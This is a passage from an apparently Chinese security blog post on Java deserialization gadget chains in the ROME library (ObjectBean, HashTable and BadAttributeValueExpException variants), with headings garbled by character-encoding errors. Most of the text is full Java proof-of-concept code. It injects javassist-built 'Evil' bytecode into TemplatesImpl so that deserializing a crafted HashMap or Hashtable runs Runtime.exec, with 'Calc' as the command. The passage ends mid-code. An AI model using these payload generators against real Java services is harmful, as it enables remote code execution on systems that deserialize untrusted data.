encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192302635.png" alt="image-20221116192302635"></p><h2 id="ä¸‰ã€å…¶å®ƒåˆ©ç”¨é“¾"><a href="#ä¸‰ã€å…¶å®ƒåˆ©ç”¨é“¾" class="headerlink" title="ä¸‰ã€å…¶å®ƒåˆ©ç”¨é“¾"></a>ä¸‰ã€å…¶å®ƒåˆ©ç”¨é“¾</h2><h3 id="ObjectBeané“¾"><a href="#ObjectBeané“¾" class="headerlink" title="ObjectBeané“¾"></a>ObjectBeané“¾</h3><p><code>ObjectBean</code>ä¸­çš„<code>hashCode</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>EqualsBean.beanHashCode()</code>ï¼Œæ‰€ä»¥ç”¨å®ƒä»£æ›¿<code>EqualsBean.beanHashCode()</code>å³å¯</p><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192311272.png" alt="image-20221116192311272"></p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectBeanGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,objectBean);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unseralize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192317879.png" alt="image-20221116192317879"></p><h3 id="HashTableé“¾"><a href="#HashTableé“¾" class="headerlink" title="HashTableé“¾"></a>HashTableé“¾</h3><p>æ›¿æ¢HashMapä½œä¸ºå…¥å£é“¾</p><p><code>HashMap.readObject()</code>ä¸­ï¼Œéå†æ‰€æœ‰keyå€¼è°ƒç”¨äº†<code>reconstitutionPut</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192332026.png" alt="image-20221116192332026"></p><p>è·Ÿè¿›ï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆè¿˜æ˜¯è°ƒç”¨ä»»æ„ç±»çš„hashCodeæ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192325740.png" alt="image-20221116192325740"></p><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashTable.readObject(ObjectInputStream)</span><br><span class="line">HashTable.reconstitutionPut(Entry)</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashtableGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashTable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashTable.put(objectBean,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192339535.png" alt="image-20221116192339535"></p><p>ä½†è¿™é‡Œä¹Ÿå­˜åœ¨åŒæ ·ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœç›´æ¥putçš„è¯è¿˜æ˜¯ä¼šæå‰è°ƒç”¨ä¸€æ¬¡key.hashCodeï¼Œå€’ç½®åºåˆ—åŒ–æ—¶ä¼šåŠ è½½ä¸€æ¬¡æ¶æ„å­—èŠ‚ç ï¼Œæ‰€ä»¥æœ€ä¼˜åŒ–çš„æ–¹æ¡ˆåº”è¯¥è¿˜æ˜¯éœ€è¦åå°„æ”¹keyå€¼ï¼Œä½†è¿™é‡Œä¸æ¸…æ¥šhashCodeçš„æ„é€ ï¼Œä¸€ç›´æ²¡æ”¹æˆåŠŸ:(,å¸Œæœ›æœ‰å¸ˆå‚…æŒ‡ç‚¹ä¸€ä¸‹o.0</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192344745.png" alt="image-20221116192344745"></p><h3 id="BadAttributeValueExpExceptioné“¾"><a href="#BadAttributeValueExpExceptioné“¾" class="headerlink" title="BadAttributeValueExpExceptioné“¾"></a>BadAttributeValueExpExceptioné“¾</h3><p>æåˆ°<code>toString()</code>ï¼Œä¸éš¾æƒ³åˆ°cc5ä¸­<code>BadAttributeValueExpException</code>çš„ç»å…¸è°ƒç”¨<code>toString()</code></p><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 